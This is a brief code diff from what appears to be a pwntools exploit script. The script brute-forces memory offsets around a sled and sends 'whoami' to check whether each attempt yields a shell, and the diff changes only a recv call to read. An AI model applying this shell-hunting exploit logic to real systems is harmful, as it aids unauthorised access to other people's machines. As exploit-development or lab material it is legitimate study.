@@ -30,7 +30,7 @@ for offset in range(-guessing_range, guessing_range, len(sled) / 2):
     # trying sending a shell command and checking the response
     try:
         p.sendline("whoami")
-        if p.recv(timeout=0.1) != "":
+        if p.read(timeout=0.1) != "":
             log.success("Offset {} works!!!".format(offset))
             working_offsets.append(offset)
     except EOFError:
